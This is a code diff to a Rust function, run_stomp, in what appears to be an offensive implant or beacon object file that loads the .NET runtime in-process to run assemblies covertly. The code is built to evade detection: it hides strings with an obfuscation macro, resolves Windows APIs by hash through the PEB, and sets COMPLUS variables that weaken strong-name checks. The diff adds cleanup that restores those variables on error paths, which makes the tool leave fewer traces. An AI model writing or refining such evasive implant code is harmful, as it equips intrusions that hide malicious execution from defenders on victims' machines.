@@ -921,6 +921,27 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                     se(k2.as_bytes().as_ptr(), v2.as_bytes().as_ptr());
                 }
 
+                // Macro to restore COMPLUS env vars; called on every early-return path
+                // after the set block to prevent the vars from staying "1" permanently.
+                macro_rules! restore_complus_env {
+                    () => {
+                        if let Some(se) = set_env {
+                            let k1 = obf!("COMPLUS_ZapDisable\0");
+                            if had_zap {
+                                se(k1.as_bytes().as_ptr(), old_zap.as_ptr());
+                            } else {
+                                se(k1.as_bytes().as_ptr(), core::ptr::null());
+                            }
+                            let k2 = obf!("COMPLUS_AllowStrongNameBypass\0");
+                            if had_sn {
+                                se(k2.as_bytes().as_ptr(), old_sn.as_ptr());
+                            } else {
+                                se(k2.as_bytes().as_ptr(), core::ptr::null());
+                            }
+                        }
+                    };
+                }
+
                 crate::dlog2(b"[stomp] CLRCreateInstance");
 
                 // Load mscoree.dll if not already loaded
@@ -932,15 +953,28 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                     let load_lib: LoadLibraryWFn =
                         match peb_fn(hash!("kernel32.dll"), hash!("LoadLibraryW")) {
                             Some(f) => f,
-                            None => return Err(BofError::Clr { hr: -1, op: "fr5" }),
+                            None => {
+                                restore_complus_env!();
+                                return Err(BofError::Clr { hr: -1, op: "fr5" });
+                            }
                         };
                     let _module = load_lib(MSCOREE_W.as_ptr());
                 }
 
-                let mscoree = resolve_module(hash!("mscoree.dll"))
-                    .ok_or(BofError::Clr { hr: -1, op: "fr6" })?;
-                let create_inst_ptr = resolve_export(mscoree, hash!("CLRCreateInstance"))
-                    .ok_or(BofError::Clr { hr: -1, op: "fr7" })?;
+                let mscoree = match resolve_module(hash!("mscoree.dll")) {
+                    Some(m) => m,
+                    None => {
+                        restore_complus_env!();
+                        return Err(BofError::Clr { hr: -1, op: "fr6" });
+                    }
+                };
+                let create_inst_ptr = match resolve_export(mscoree, hash!("CLRCreateInstance")) {
+                    Some(p) => p,
+                    None => {
+                        restore_complus_env!();
+                        return Err(BofError::Clr { hr: -1, op: "fr7" });
+                    }
+                };
                 type CreateFn = unsafe extern "system" fn(
                     *const Guid,
                     *const Guid,
@@ -951,6 +985,7 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                 let mut meta_host: *mut c_void = core::ptr::null_mut();
                 let hr = create_fn(&CLSID_CLR_META_HOST, &IID_ICLR_META_HOST, &mut meta_host);
                 if hr < 0 {
+                    restore_complus_env!();
                     return Err(BofError::Clr { hr, op: "fr8" });
                 }
                 let meta_host = meta_host as *mut opsec_com::clr::ICLRMetaHost;
@@ -968,6 +1003,7 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                     ((*(*unk).vtbl).release)(unk as *mut c_void);
                 }
                 if hr < 0 {
+                    restore_complus_env!();
                     return Err(BofError::Clr { hr, op: "fr9" });
                 }
                 let runtime_info = runtime_info as *mut opsec_com::clr::ICLRRuntimeInfo;
@@ -982,6 +1018,7 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                 if hr_is >= 0 && started != 0 {
                     let unk = runtime_info as *mut IUnknown;
                     ((*(*unk).vtbl).release)(unk as *mut c_void);
+                    restore_complus_env!();
                     return Err(BofError::Clr { hr: -1, op: "frA" });
                 }
 
@@ -995,6 +1032,7 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                 if hr < 0 {
                     let unk = runtime_info as *mut IUnknown;
                     ((*(*unk).vtbl).release)(unk as *mut c_void);
+                    restore_complus_env!();
                     return Err(BofError::Clr { hr, op: "frB" });
                 }
                 let custom_host = custom_host_raw as *mut ICLRRuntimeHost;
@@ -1007,6 +1045,7 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                 if hr < 0 {
                     let unk = runtime_info as *mut IUnknown;
                     ((*(*unk).vtbl).release)(unk as *mut c_void);
+                    restore_complus_env!();
                     return Err(BofError::Clr { hr, op: "frC" });
                 }
 
@@ -1015,6 +1054,7 @@ pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
                 if hr < 0 {
                     let unk = runtime_info as *mut IUnknown;
                     ((*(*unk).vtbl).release)(unk as *mut c_void);
+                    restore_complus_env!();
                     return Err(BofError::Clr { hr, op: "frD" });
                 }
 
